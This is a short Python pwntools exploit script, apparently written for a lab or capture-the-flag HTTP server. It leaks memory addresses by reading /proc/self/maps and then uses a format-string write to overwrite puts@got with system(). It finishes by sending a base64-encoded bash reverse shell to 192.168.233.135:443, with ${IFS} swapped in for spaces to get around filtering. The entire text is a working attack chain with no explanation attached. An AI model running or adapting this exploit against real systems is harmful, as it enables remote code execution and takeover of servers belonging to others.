#!/usr/bin/python3
from pwn import remote, fmtstr_payload, base64

def urlencode(bytes):
    result = b""

    for byte in bytes:
         result += ("%" + hex(byte)[2:]).encode()

    return result

shell = remote("localhost", 9999)
shell.sendline(b"GET //proc/self/maps\r\nRange: bytes=0-1000\r\n")

binary_base = int(shell.recvline_contains(b"httpserver")[:8], 16)
libc_base = int(shell.recvline_contains(b"libc-2.27")[:8], 16)

shell.close()

payload = urlencode(fmtstr_payload(53, {
    binary_base + 0x5048: # puts@got
    libc_base + 0x3cd10   # system()
}))

command = base64.b64encode(b"bash -i >& /dev/tcp/192.168.233.135/443 0>&1").decode()
command = f"echo {command} | base64 -d | bash".encode().replace(b" ", b"${IFS}")

shell = remote("localhost", 9999)
shell.sendline(command + b" /" + payload + b"\r\n")
shell.close()
